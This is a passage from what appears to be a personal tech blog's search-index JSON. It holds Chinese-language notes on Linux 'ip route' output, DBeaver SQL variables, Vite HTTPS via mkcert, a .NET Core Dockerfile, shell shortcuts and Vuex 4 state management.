在組件上使用\n\n![](https://i.imgur.com/3H4h4Pn.png)\n\n還滿特別的，建議去看官方文件範例:[Class 与 Style 绑定 - 在組件上使用 | Vue.js](https://v3.cn.vuejs.org/guide/class-and-style.html#%E5%9C%A8%E7%BB%84%E4%BB%B6%E4%B8%8A%E4%BD%BF%E7%94%A8)","tags":["vue"],"categories":["Vue"]},{"title":"查看 IP 指令和路由筆記","url":"%2Fblog%2F2021%2F07%2F14%2F%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98%2F","content":"\n\n之前寫[一張網卡使用多組 IP 方法 - 使用上設定防火牆陷阱 | 程式狂想筆記](https://malagege.github.io/blog/2020/05/30/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/#%E4%BD%BF%E7%94%A8%E4%B8%8A%E8%A8%AD%E5%AE%9A%E9%98%B2%E7%81%AB%E7%89%86%E9%99%B7%E9%98%B1)有談過`使用上設定防火牆陷阱`，彈要怎麼看出去方法`ip route show`，但我對輸出出來資訊不太懂，今天特別研究一下。\n\n\n<!--more-->\n\n## ip 詳細指令\n\n[linux IP命令简介 - 簡書](https://www.jianshu.com/p/5f933834a5c2) [備份圖](https://i.imgur.com/LXEBoQA.png)\n\n我找出介紹詳細指令簡介，建議可以看一下，相關問題可以解決。\n\n\n## 所以要怎麼看出去 ip?\n\n\n### ip route show \n\n```\n#ip route show\ndefault via 10.0.2.2 dev enp0s3 proto dhcp metric 100\ndefault via 192.168.99.1 dev enp0s8 proto static metric 101\n10.0.2.0/24 dev enp0s3 proto kernel scope link src 10.0.2.15 metric 100\n10.244.0.0/24 via 10.244.0.0 dev flannel.1 onlink\n10.244.1.0/24 dev cni0 proto kernel scope link src 10.244.1.1\n10.244.2.0/24 via 10.244.2.0 dev flannel.1 onlink\n172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1\n192.168.99.0/24 dev enp0s8 proto kernel scope link src 192.168.99.111 metric 101\n\n```\n\n> default表示默認的route，即其他route規則沒有生效就默認使用該條規則。兩條default規則分別對應不同的device。\n> dev表示device，即使用的interface是哪個\n> proto表示該條規則的protocol identifier，有：\n> \n>     redirect，該路由是由於ICMP redirect產生(install)\n>     kernel，該路由是在內核進行自動配置的時候產生的\n>     boot，該路由是在bootup的時候產生\n>     static，該路由是由管理員增加的，為了覆蓋動態路由\n>     ra，該路由由Router Discovery tool產生\n> \n> scope，同上面ip addr show介紹的scope\n> src，表示為優先選擇的源地址，當給目標地址發包的時候\n> metric，表示到目的地的距離(the 'distance' to the target)，是一個數字，其單位可以是：Hop, Delay, Throughput, Reliability\n\n參考來源: \n[linux IP命令简介 - 簡書](https://www.jianshu.com/p/5f933834a5c2)\n[通俗理解IP路由 - SegmentFault 思否](https://segmentfault.com/a/1190000019363010)\n\n其實我還是覺得這樣還是很不方便看，`route`指令可以看到那些外部 IP 會倒哪個 Gateway。後面也會講 route 指令也被廢棄了...\n\n這邊也可以設定一個固定 IP 會指定至到哪一個 Gateway，設定結果如下。\n\n```\n10.88.22.11 via 172.26.15.254 dev eth1 \n10.88.22.12 via 172.26.15.254 dev eth1 \n10.88.22.13 via 172.26.15.254 dev eth1 \n```\n這邊我觀查 via 後面是放 Gateway IP，前面是目標 IP 會指定一個 Gateway 傳出去。程式寫太久，再回來看真的會忘記...\n\n#### 小記看 ip route 技巧\n\n```\ndefault via 10.89.8.254 dev eth0 \n10.88.22.11 via 172.26.15.254 dev eth1 \n10.88.22.12 via 172.26.15.254 dev eth1 \n10.88.22.13 via 172.26.15.254 dev eth1 \n10.89.8.0/24 dev eth0  proto kernel  scope link  src 10.89.8.88 \n169.254.0.0/16 dev eth2  scope link  metric 1004 \n169.254.0.0/16 dev eth1  scope link  metric 1005 \n169.254.0.0/16 dev eth0  scope link  metric 1006 \n172.26.15.0/24 dev eth1  proto kernel  scope link  src 172.26.15.30 \n172.26.25.0/24 dev eth2  proto kernel  scope link  src 172.26.25.100 \n\n```\n\n步驟 \n\n1. 尋找目標 IP 對應上面 via 關鍵字搜尋會指定到哪一個 Gateway ，沒有的話就看 default Gateway\n2. 尋找 Gatway IP 範圍，如:10.89.8.254 => 10.89.8.0/24\n3. 找出那一行的 src 10.89.8.88 \n\n> src，表示為優先選擇的源地址，當給目標地址發包的時候\n\n\n### ip a \n\n我覺得 `ip route show ` 比較難第一時間看出來，在想有什麼關鍵字可以看結果。\n\n[linux IP命令简介 - 簡書](https://www.jianshu.com/p/5f933834a5c2)裡面有提到`secondary`當為外發的網絡包選擇默認源地址時不使用該地址\n\n> secondary，當為外發的網絡包選擇默認源地址時不使用該地址\n\n這樣來看確實可以馬上看出來，不過 `ifconfig` 沒有看到相關資訊。\n\n```\n# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n....\n6: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000\n    link/ether xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff\n    inet 10.89.8.88/24 brd 10.89.8.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.103/24 brd 10.89.8.255 scope global secondary eth0:103\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.104/24 brd 10.89.8.255 scope global secondary eth0:104\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.105/24 brd 10.89.8.255 scope global secondary eth0:105\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.106/24 brd 10.89.8.255 scope global secondary eth0:106\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.107/24 brd 10.89.8.255 scope global secondary eth0:107\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.108/24 brd 10.89.8.255 scope global secondary eth0:108\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.109/24 brd 10.89.8.255 scope global secondary eth0:109\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.110/24 brd 10.89.8.255 scope global secondary eth0:110\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.113/24 brd 10.89.8.255 scope global secondary eth0:113\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.114/24 brd 10.89.8.255 scope global secondary eth0:114\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.115/24 brd 10.89.8.255 scope global secondary eth0:115\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.116/24 brd 10.89.8.255 scope global secondary eth0:116\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.117/24 brd 10.89.8.255 scope global secondary eth0:117\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.118/24 brd 10.89.8.255 scope global secondary eth0:118\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.165/24 brd 10.89.8.255 scope global secondary eth0:165\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.193/24 brd 10.89.8.255 scope global secondary eth0:193\n       valid_lft forever preferred_lft forever\n    inet 10.89.8.91/24 brd 10.89.8.255 scope global secondary eth0:91\n       valid_lft forever preferred_lft forever\n    inet6 fe80::f002:2aff:feff:b865/64 scope link \n\n\n```\n\n\n## 被廢棄掉的指令(彩蛋)\n\n有空詳細記錄。\n\nifconfig -> ip a\ntraceroute -> tracepath\n[linux - traceroute command: replacement or alternative - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/500796/traceroute-command-replacement-or-alternative)\nroute -> ip route\n[Deprecated Linux networking commands and their replacements | Doug Vitale Tech Blog](https://dougvitale.wordpress.com/2011/12/21/deprecated-linux-networking-commands-and-their-replacements/)\n\n### 查看 ip expose port\n\n[[轉]Linux 查看程式用哪些 port 方法 | 程式狂想筆記](https://malagege.github.io/blog/2020/09/28/Linux-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BC%8F%E7%94%A8%E5%93%AA%E4%BA%9B-port-%E6%96%B9%E6%B3%95/)\n\n```bash\nnetstat -an |grep LISTEN \nss -an |grep LISTEN\n```","tags":["route"],"categories":["網路"]},{"title":"Dbeaver 使用變數 做SQL 範本 和查詢設定 title","url":"%2Fblog%2F2021%2F07%2F14%2FDbeaver-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8-%E5%81%9ASQL-%E7%AF%84%E6%9C%AC-%E5%92%8C%E6%9F%A5%E8%A9%A2%E8%A8%AD%E5%AE%9A-title%2F","content":"\nDbeaver 使用變數 做SQL 範本 和查詢設定 title\n\n<!--more-->\n\n## Dbeaver 使用變數\n\n```sql\n@set a = '1'\n@set b = '1'\n\n\nSELECT :a FROM dual;\n\nSELECT :b FROM dual;\n```\n按下![](https://i.imgur.com/atqu9d0.png)\n\n可查多個查詢\n![](https://i.imgur.com/9zh6NIk.png)\n\n\n### sql developer  使用變數方法(番外)\n\n```sql\ndefine abc=1;\nselect * from dual where rownum=&abc;\n```\n\n## 設定查詢標籤\n\n一般我們維運不可能只查一次SQL\n多個SQL執行，標籤不好分辨是什麼\n我有查到使用方式\n\n```sql\n@set a = '1'\n@set b = '1'\n\n-- title: test1\nSELECT :a FROM dual;\n\n-- title: test2\nSELECT :b FROM dual;\n```\n\n![](https://i.imgur.com/PGldd2H.png)\n\n\n\n參考: [mysql - Is there a way to define the names of the result tabs names in an SQL Script in DBeaver? - Stack Overflow](https://stackoverflow.com/questions/47081804/is-there-a-way-to-define-the-names-of-the-result-tabs-names-in-an-sql-script-in)","tags":["sql"],"categories":["實用工具"]},{"title":"Vite 使用 https 憑證服務方法(搭 mkcert )","url":"%2Fblog%2F2021%2F07%2F04%2FVite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert%2F","content":"\n現在很多開發都需要 HTTPS ，但是在 localhost 預設是沒有 HTTPS，要怎麼在 Vite 快速在開發環境用 HTTPS？爬了一些 Google 文章，來記錄一下。\n\n<!--more-->\n\n## 舊文使用方式\n\n[[Vite] Enabling https on localhost - DEV Community](https://dev.to/web2033/vite-enabling-https-on-localhost-2ckf)\n\n## 安裝 vite-plugin-mkcert\n\n[vite-plugin-mkcert/README-zh_CN.md at main · liuweiGL/vite-plugin-mkcert](https://github.com/liuweiGL/vite-plugin-mkcert/blob/main/README-zh_CN.md)\n\n### 安裝 vite-plugin-mkcert vite & mkcert\n\n**Windows 使用 Administrator 帳號安裝 mkcert!!**\n**Windows 使用 Administrator 帳號安裝 mkcert!!**\n**Windows 使用 Administrator 帳號安裝 mkcert!!**\n\n\n\n```bash\nchoco install mkcert\n# 安裝指令不用做，vite-plugin-mkcert 就會幫忙做\n# mkcert -install\n# mkcert localhost\n```\n\n\n```bash\n# 沒執行過 mkcert 可以用 Administrator 執行\nnpm install vite-plugin-mkcert -D \n```\n\nLinux 可參考[FiloSottile/mkcert: A simple zero-config tool to make locally trusted development certificates with any names you'd like.](https://github.com/FiloSottile/mkcert)，步驟可能需要自己編譯\n\n### 配置 vite\n\nvite.config.js\n```javascript\nimport { defineConfig } from 'vite'\nimport mkcert from 'vite-plugin-mkcert'\n\n// https://vitejs.dev/config/\nexport default defineConfig({\n  server: {\n    https: true\n  },\n  plugins: [mkcert()]\n})\n\n```\n\n簡單注意:\n1. `import mkcert from 'vite-plugin-mkcert'`\n2. `https: true`\n3. `plugins: [mkcert()]`\n\n\n\n### 執行 Vite \n\n`npm run dev`\n\n第一次會跳出下面圖示，會安裝CA到電腦上面，記得按是。\n![](https://i.imgur.com/tW9KWCZ.png)\n\n\n如果看到不受信任網域，瀏覽器可能需要關掉重開，才能正常看到。\n\n\n基本上做到這邊就完成了，如果你還有興趣可以往下看。\n\n\n## 憑證跑去哪?\n\n在`環境變數`加入下面這段\n```shell\n# window powershell\n $Env:DEBUG = \"vite:plugin:mkcert\"\n# linux \nexport DEBUG = \"vite:plugin:mkcert\"\n```\n\nwindow powershell 詳細使用環境變數方法[關於環境變數 - PowerShell | Microsoft Docs](https://docs.microsoft.com/zh-tw/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-7.1)\n\n```\nThe certificate is saved in:\nC:\\Users\\Administrator\\.vite-plugin-mkcert\\certs\\dev.key\nC:\\Users\\Administrator\\.vite-plugin-mkcert\\certs\\dev.pem\n```\n\nlog 打開可以看到放在家目錄。程式碼也可以看到裡面這樣寫([vite-plugin-mkcert/constant.ts at main · liuweiGL/vite-plugin-mkcert](https://github.com/liuweiGL/vite-plugin-mkcert/blob/main/packages/plugin/src/lib/constant.ts))\n\n","tags":["mkcert"],"categories":["Vue"]},{"title":".Net Core 建置 Docker 映像檔","url":"%2Fblog%2F2021%2F06%2F27%2FNet-Core-%E5%BB%BA%E7%BD%AE-Docker-%E6%98%A0%E5%83%8F%E6%AA%94%2F","content":"\n最近同事收到要把`.Net Core`程式轉移到 K8S，但是維運不會處理 Image，剛好我對 Docker 有小小的研究，但對 .Net Core 不是很熟，最後爬了文章，成功處理 Image。\n\n<!--more-->\n\n## Dockerfile 參考\n\n[dotnet-docker/nuget-credentials.md at 203e3e7c2cbb6a4ac73290c603ef02d249128500 · dotnet/dotnet-docker · GitHub](https://github.com/dotnet/dotnet-docker/blob/203e3e7c2cbb6a4ac73290c603ef02d249128500/documentation/scenarios/nuget-credentials.md)\n\n[dotnet-docker/samples/aspnetapp at main · dotnet/dotnet-docker · GitHub](https://github.com/dotnet/dotnet-docker/tree/main/samples/aspnetapp)\n\n## 執行遇到錯誤\n\n原開發是 window ，程式搬到 docker ，執行會有錯誤。如下:\n\n```\n#12 1.179 /usr/share/dotnet/sdk/5.0.202/Sdks/Microsoft.NET.Sdk/targets/Microsoft.PackageDependencyResolution.targets(241,5): error MSB4018: The \"ResolvePackageAssets\" task failed unexpectedly. [/source/xxxx/xxxx.csproj]\n#12 1.179 /usr/share/dotnet/sdk/5.0.202/Sdks/Microsoft.NET.Sdk/targets/Microsoft.PackageDependencyResolution.targets(241,5): error MSB4018: NuGet.Packaging.Core.PackagingException: Unable to find fallback package folder \n```\n\n由於 docker 上環境路徑不正確，做後發現下`dotnet restore`可以解決...，因為我不是寫 .Net Core 我就先忽略研究，初估重製環境設定路徑。\n\n`dotnet restore`\n\n\n## 範例\n\n```dockerfile\n# https://hub.docker.com/_/microsoft-dotnet\nFROM mcr.microsoft.com/dotnet/sdk:5.0 AS build\nWORKDIR /source\n\n# copy csproj and restore as distinct layers\n# COPY *.sln .\n# COPY APP_PROJECT/*.csproj ./APP_PROJECT/\n\n\n# copy everything else and build app\nCOPY APP_PROJECT/. ./APP_PROJECT/\nWORKDIR /source/APP_PROJECT\nRUN dotnet restore\nRUN dotnet publish -c release -o /app --no-restore\n\n# final stage/image\nFROM mcr.microsoft.com/dotnet/aspnet:5.0\nWORKDIR /app\nCOPY --from=build /app ./\n\nEXPOSE 80\n\nENTRYPOINT [\"dotnet\", \"APP_PROJECT.dll\"]\n```\n\n`APP_PROJECT` 再置換掉對應專案名稱\n\n\n\n因為我朋友專案沒有sln 檔案，所以上面那幾但註解\n這樣就順利 build 出 docker image","tags":[".net core"],"categories":["Docker"]},{"title":"Linux 操作技巧","url":"%2Fblog%2F2021%2F06%2F27%2FLinux-%E6%93%8D%E4%BD%9C%E6%8A%80%E5%B7%A7%2F","content":"\n[My 5 Favorite Linux Shell Tricks for SPEEEEEED (and efficiency) - YouTube](https://www.youtube.com/watch?v=V8EUdia_kOE)\n看到 Youtube 推薦 Linux 操作技巧，感覺特別有趣，所以紀錄一下。\n\n<!--more-->\n\n1:04​ - sudo !! - re-run previous command with 'sudo' prepended\n1:53​ - ctrl-k, ctrl-u, ctrl-w, ctrl-y - cutting and pasting text in the command line\n\nCtrl+K 刪後面文字\nCtrl+U 刪前面文字\n\n\"Alt + backspace\" is more useful than \"ctrl + w\"\n\n[Bash Shell 快速鍵 – Tsung's Blog](https://blog.longwin.com.tw/2006/09/bash_hot_key_2006/)\n[Bash環境下 Ctrl+A~Z @ Altohorn-linux :: 隨意窩 Xuite日誌](https://blog.xuite.net/altohorn/linux/17259883)\n\n3:24​ - practical kill/yank example\nCtrl+U 剪下全部 \nCtrl+Y 貼上\n\n4:04​ - use 'less +F' to view logfiles, instead of 'tail' (ctrl-c, shift-f, q to quit)\n\n[使用less +F滚动查看日志_polygun2000_新浪博客](http://blog.sina.com.cn/s/blog_704836f401011mcv.html)\n\n\n6:25​ - ctrl-x-e - continue editing your current shell line in a text editor (uses $EDITOR)\n7:54​ - alt-. - paste previous command's argument (useful for running multiple commands on the same resource)\n9:18​ - reset - resets/unborks your terminal\n","tags":["linux"],"categories":["Linux"]},{"title":"Vuex 學習筆記","url":"%2Fblog%2F2021%2F06%2F27%2FVuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98%2F","content":"\n這篇 Vuex 學習筆記，會大量引用[Vuex 官方文章](https://next.vuex.vuejs.org/zh/)，算是自己學習重點筆記。\n\n<!--more-->\n\n## 心法\n\n\n### 狀態管理模式\n\n```javascript=\nconst Counter = {\n  // 狀態\n  data () {\n    return {\n      count: 0\n    }\n  },\n  // 視圖\n  template: `\n    <div>{{ count }}</div>\n  `,\n  // 操作\n  methods: {\n    increment () {\n      this.count++\n    }\n  }\n}\n\ncreateApp(Counter).mount('#app')\n\n```\n\n以上包含以下幾個部分：\n\n    狀態，驅動應用的數據源；\n    視圖，以聲明方式將狀態映射到視圖；\n    操作，響應在視圖上的用戶輸入導致的狀態變化。\n    \n![](https://i.imgur.com/28g38YH.png)\n\n詳細[Vuex 是什么？ | Vuex](https://next.vuex.vuejs.org/zh/)\n\n### vuex\n\n![](https://i.imgur.com/Zg1OK9y.png)\n\n\n[Vuex 是什么？ | Vuex](https://next.vuex.vuejs.org/zh/)\n\n### 非套件做到的狀態管理\n\n[状态管理 | Vue.js](https://v3.cn.vuejs.org/guide/state-management.html#%E7%BB%99-react-%E5%BC%80%E5%8F%91%E8%80%85%E7%9A%84%E5%8F%82%E8%80%83%E4%BF%A1%E6%81%AF)\n\n## 安裝\n\n```bash=\nnpm install vuex@next --save\n```\n\n###  最簡單的 Store\n\n> Vuex 和單純的全局對象有以下兩點不同：\n>\n>    Vuex 的狀態存儲是響應式的。當 Vue 組件從 store 中讀取狀態的時候，若 store 中的狀態發生變化，那麼相應的組件也會相應地得到高效更新。\n>\n>    你不能直接改變 store 中的狀態。改變 store 中的狀態的唯一途徑就是顯式地提交 (commit) mutation。這樣使得我們可以方便地跟蹤每一個狀態的變化，從而讓我們能夠實現一些工具幫助我們更好地瞭解我們的應用。\n\n簡單來講，處理 store 狀態需要提交(commit) mutation 。(所以外部操作 vuex store 可以修改?)\n\n:::success\nmutation 翻譯為變化；浮沉盛衰；變質\n參考:[mutation - Yahoo奇摩字典 搜尋結果](https://tw.dictionary.search.yahoo.com/search?p=mutation)\n:::\n\n\n一個初始 state 對象和一些 mutation：\n這邊還滿有趣的，vuex4 和 vuex3 這邊寫法就不一樣了\n\nMain.js\n```javascript=\nimport { createApp } from 'vue'\nimport { createStore } from 'vuex'\nimport App from './App.vue'\n\n// 創建一個新的 store 實例\nconst store = createStore({\n    state () {\n      return {\n        count: 0\n      }\n    },\n    mutations: {\n      increment (state) {\n        state.count++\n      }\n    }\n  })\n  \n// 將 store 實例作為插件安裝\n// app.use(store)\ncreateApp(App).use(store).mount('#app')\n\n//測試\nstore.commit('increment')\n\nconsole.log(store.state.count) // -> 1\n\n\n// 證明也是能直接改 state\nstore.state.count=100\nconsole.log(store.state.count)\n```\n\n之前看到舊版本使用 `$this.store`，但看新版本好像很少這樣看到。\n\n> 為了修復 issue #994，Vuex 4 刪除了 this.$store 在 Vue 組件中的全局類型聲明。當使用 TypeScript 時，必須聲明自己的模塊補充(module augmentation)。\n\n可能是因為要讓 TypeScript 支援原因，可參考:[從 3.x 遷移到 4.0 | Vuex](https://next.vuex.vuejs.org/zh/guide/migrating-to-4-0-from-3-x.html#%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B)。\n\n\n組件呼叫改 State 狀態\n```javascript=\nmethods: {\n  increment() {\n    this.$store.commit('increment')\n    console.log(this.$store.state.count)\n  }\n}\n\n```\n\nGIT: [https://github.com/malagege/vuex-test/commit/a05d6cc9bd64e11de6be51a57a1f1e547b637a46](https://github.com/malagege/vuex-test/commit/a05d6cc9bd64e11de6be51a57a1f1e547b637a46)\n\n\n> 再次強調，我們通過提交 mutation 的方式，而非直接改變 store.state.count，是因為我們想要更明確地追蹤到狀態的變化。這個簡單的約定能夠讓你的意圖更加明顯，這樣你在閱讀代碼的時候能更容易地解讀應用內部的狀態改變。此外，這樣也讓我們有機會去實現一些能記錄每次狀態改變，保存狀態快照的調試工具。有了它，我們甚至可以實現如時間穿梭般的調試體驗。\n> \n> 由於 store 中的狀態是響應式的，在組件中調用 store 中的狀態簡單到僅需要在計算屬性中返回即可。觸發變化也僅僅是在組件的 methods 中提交 mutation。\n\n\n這邊修改store.state 需要透過 Vue Component 的 method 去做提交(commit) mutation 。\n這邊修改store.state 需要透過 Vue Component 的 method 去做提交(commit) mutation 。\n這邊修改store.state 需要透過 Vue Component 的 method 去做提交(commit) mutation 。\n\n因為看起來很重要，所以講三遍XD\n\n\n## State\n\n> Vuex 使用單一狀態樹——是的，用一個對象就包含了全部的應用層級狀態。至此它便作為一個「唯一數據源 (SSOT )」而存在。\n\n\n在 Vue 組件中獲得 Vuex 狀態，一般都是用 computed 狀態取得出來。[计算属性和侦听器 — Vue.js](https://cn.vuejs.org/v2/guide/computed.html)\n\n```javascript=\n// 創建一個 Counter 組件\nconst Counter = {\n  template: `<div>{{ count }}</div>`,\n  computed: {\n    count () {\n      return store.state.count\n    }\n  }\n}\n\n```\n\n> Vuex 通過 Vue 的插件系統將 store 實例從根組件中「注入」到所有的子組件裡。且子組件能通過 this.$store 訪問到。讓我們更新下 Counter 的實現：\n```javascript=\nconst Counter = {\n  template: `<div>{{ count }}</div>`,\n  computed: {\n    count () {\n      return this.$store.state.count\n    }\n  }\n}\n\n```\n\n###  mapState 輔助函數\n\n小記：通常用在 computed 上面\n\n\n> 當一個組件需要獲取多個狀態的時候，將這些狀態都聲明為計算屬性會有些重複和冗餘。為瞭解決這個問題，我們可以使用 mapState 輔助函數幫助我們生成計算屬性，讓你少按幾次鍵：\n\n```javascript=\n// 在單獨構建的版本中輔助函數為 Vuex.mapState\nimport { mapState } from 'vuex'\n\nexport default {\n  // ...\n  computed: mapState({\n    // 箭頭函數可使代碼更簡練\n    count: state => state.count,\n\n    // 傳字符串參數 'count' 等同於 `state => state.count`\n    countAlias: 'count',\n\n    // 為了能夠使用 `this` 獲取局部狀態，必須使用常規函數\n    countPlusLocalState (state) {\n      return state.count + this.localCount\n    }\n  })\n}\n\n```\n\n\n#### (一般)使用\n\n\n```javascript=\ncomputed: mapState([\n  // 映射 this.count 為 store.state.count\n  'count'\n])\n```\n\nGIT: [https://github.com/malagege/vuex-test/commit/4e9b200cdcca3a043ff9e94c446b2d4900c1e5d0](https://github.com/malagege/vuex-test/commit/4e9b200cdcca3a043ff9e94c446b2d4900c1e5d0)\n\n但一般 `computed` 不可能全部包給 `mapState`。所以我們要可以使用 ES 解構。\n\n\n```javascript=\ncomputed: {\n  localComputed () { /* ... */ },\n  // 使用對象展開運算符將此對象混入到外部對象中\n  ...mapState({\n      count: state=>state.count,\n    // ...\n  })\n}\n```\n\nGIT: [https://github.com/malagege/vuex-test/commit/9c690013d6cc52afc1cd72eb801ac16fc4bf5d1d](https://github.com/malagege/vuex-test/commit/9c690013d6cc52afc1cd72eb801ac16fc4bf5d1d)\n\n\n#### 小記\n\n```\nconsole.log(mapState({count:state=>state.count}))\n```\n![](https://i.imgur.com/jYqelPi.png)\n\n這邊查看結果，mapState會回傳物件，然後用`...`解構回去塞進 `computed`。\n\n這邊`mapState`有兩個用法。\n\n1. 帶 Array\n2. 帶 物件(Object)\n\nArray，只能帶字串，不能做到客製化。\n\nObject ，可做到多個客製化。\n\n這邊第一次看，會有點混亂，分成兩類看就還好。\n\n回顧 State，簡單來說就是 vuex 的 state (狀態)要在 Compment 取得時候用 `computed` 去做 mapState 動作。\n\n~~等等，程式是死的，人是活的，可以在 methods 呼叫?~~\n這當然是可以，但為了程式可用性，最好不要用在別的地方。\n好了，當然我用在 methods 上面不能使用。應該跟內部程式有關係。\n\n`mapState({count:state=>state.count}).count` 也能讀到資料。但正常不會正樣用\n\n\n## Getter\n\n有點像 一般 Component 的 `computed`。\n\n### \n\nmain.js (官方這邊文件有寫錯...)\n```\nconst store = createStore({\n  state: {\n    todos: [\n      { id: 1, text: '...', done: true },\n      { id: 2, text: '...', done: false }\n    ]\n  },\n  getters: {\n    doneTodos(state){\n      return state.todos.filter(todo => todo.done)\n    }\n  }\n})\n\nconsole.log( store.getters.doneTodos[0].id)\nconsole.log('store.getters.doneTodos :' + store.getters.doneTodos )\n\n\n```\n\n\nGIT: [https://github.com/malagege/vuex-test/commit/750360bfa2a97e02aa1c84708a33edfe9718366e](https://github.com/malagege/vuex-test/commit/750360bfa2a97e02aa1c84708a33edfe9718366e)\n\n### 通過屬性訪問\n\n```javascript=\ngetters: {\n  // ...\n  doneTodosCount (state, getters) {\n    return getters.doneTodos.length\n  }\n}\n```\n\n這邊比較特別看第二參數是用`getters`，裡面可以用 getters 變數\n\n當然也可以用\n\n```javascript=\ncomputed: {\n  doneTodosCount () {\n    return this.$store.getters.doneTodosCount\n  }\n}\n```\n\n\n### 通過方法訪問(特別)\n\n\n```javascript=\ngetters: {\n  // ...\n  getTodoById: (state) => (id) => {\n    return state.todos.find(todo => todo.id === id)\n  }\n}\n```\nGIT: [https://github.com/malagege/vuex-test/commit/536f50d2aab41bf5448b6f617f124a8913a808aa]()\n\n\n簡單說，Function 裡面回傳 Function 。還滿特別用法。\n\n\n### mapGetters 輔助函數\n\n也是用在`computed`。\n\n\n```javascript=\nimport { mapGetters } from 'vuex'\n\nexport default {\n  // ...\n  computed: {\n  // 使用對象展開運算符將 getter 混入 computed 對象中\n    ...mapGetters([\n      'doneTodosCount',\n      'anotherGetter',\n      // ...\n    ])\n  }\n}\n\n```\n\n\n```javascript=\n...mapGetters({\n  // 把 `this.doneCount` 映射為 `this.$store.getters.doneTodosCount`\n  doneCount: 'doneTodosCount'\n})\n\n```\n\n\n\n## Mutation\n\n> 提交 mutations 是改變 Vuex 中 store 的唯一方式。 mutations 非常類似於組件中的事件（event），每個 mutation 都有一個字串的 事件類型 (type) 和一個回調函數 (handler)， handler 就是我們實際進行狀態更改的地方，並且他會接受 state 作為第一個參數\n\n[[Vue.js] Vuex 學習筆記 (7) - mutations 的核心概念 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10191451)[備份圖](https://user-images.githubusercontent.com/6058558/123091931-8053fe00-d45c-11eb-90b5-8c1679840b60.png)\n\n\n這邊我原本看不懂這句`mutations 非常類似於組件中的事件（event），每個 mutation 都有一個字串的 事件類型 (type) 和一個回調函數 (handler)`，後來看到上面文字敘述才了解。\n\n簡單來說，`事件類型 (type)`我們常用 JS Event 都是用 `trigger` 去觸發事件，Vuex 是用 `store.commit`，`一個回調函數 (handler)`是指 store 裡的 mutations 的 function ，type命名在function 上面。這樣看真的很像 Event。\n\n可參照上面敘述看下面程式:\n```javascript=\nconst store = createStore({\n  state: {\n    count: 1\n  },\n  mutations: {\n    increment (state) {\n      // 变更状态\n      state.count++\n    }\n  }\n})\n\n```\n\n呼叫 mutation 要用\n\n```javascript=\nstore.commit('increment')\n```\n\n![圖片](https://user-images.githubusercontent.com/6058558/123091878-6e725b00-d45c-11eb-9e00-9be9e9c1fd0b.png)\n\nGIT: [https://github.com/malagege/vuex-test/commit/00bd0b93a7ffb3d41a413eabc519cb15a3a2df2f](https://github.com/malagege/vuex-test/commit/536f50d2aab41bf5448b6f617f124a8913a808aa)\n\n### 什麼是 payload\n\n> payload意思即為承載量，在開發中則是指出在一堆資料中我們所關心的部分!\n> google到一篇很好的文章對payload為何這樣叫有很好的解釋，文中指出這個名詞是借用運輸工具上的觀念而來的，例如：卡車、油罐車、貨輪等所謂的載具，然後通常一個載具的總重量一定大於載具的承載量，例如油罐車的總重量包含了他所運載的油量、司機的重量、油罐車行駛所需的油量，但我們所關心僅是油罐車所承載的油量而已。\n\n簡單來說，當作一個data的主體，例如像健保卡一樣，裡面存放資料。\n\n[開發中，常見的參數payload是什麼? - Noel Saga](http://noelsaga.herokuapp.com/blog/2015/07/18/kai-fa-zhong-,chang-jian-de-can-shu-payloadshi-shi-mo)\n\n### 提交載荷(payload)\n\n> 你可以向 store.commit 傳入額外的參數，即 mutation 的載荷（payload）：\n\n```javascript=\n// ...\nmutations: {\n  increment (state, n) {\n    state.count += n\n  }\n}\n\n```\n\n```javascript=\nstore.commit('increment', 10)\n```\n\n\nGIT: [https://github.com/malagege/vuex-test/commit/e04820c2cd0245e0faee9364ecf0aa927c9019bc](https://github.com/malagege/vuex-test/commit/e04820c2cd0245e0faee9364ecf0aa927c9019bc)\n\n> 在大多數情況下，載荷應該是一個**物件**，這樣可以包含多個字段並且記錄的 mutation 會更易讀：\n\n```javascript=\n// ...\nmutations: {\n  increment (state, payload) {\n    state.count += payload.amount\n  }\n}\n\n```\n\n```javascript=\nstore.commit('increment', {\n  amount: 10\n})\n```\n\nGIT: 